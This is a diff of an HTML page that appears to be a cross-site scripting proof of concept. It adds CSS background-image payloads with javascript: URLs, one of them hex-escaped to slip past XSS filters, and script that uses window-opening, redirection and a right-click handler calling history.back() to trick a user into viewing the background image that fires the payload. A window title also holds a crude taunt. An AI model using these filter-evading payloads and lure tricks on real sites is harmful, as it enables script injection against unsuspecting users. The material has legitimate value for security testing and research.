@@ -1,5 +1,27 @@
 <style>img{background-image:url('javascript:alert(location)')}</style>
 
-To further evade any XSS filters:
-
 <style>*{background-image:url('\6A\61\76\61\73\63\72\69\70\74\3A\61\6C\65\72\74\28\6C\6F\63\61\74\69\6F\6E\29')}</style>
+
+<button id="qbutt">click me</button>
+
+<script>
+var qwin;
+
+qbutt.onclick=e=>{
+	qwin=open('you are gay - vxp','qab');
+	
+	setTimeout(function(){
+		open('imgXss.html','qab')
+	},1000)
+}
+</script>
+
+<style>*{background-image:url('javascript:alert(location)')}</style>
+
+<b> Right click, wait for redirection then click 'view background image'</b>
+
+<script>
+window.oncontextmenu=e=>{
+	setTimeout("history.back()",100)
+}
+</script>
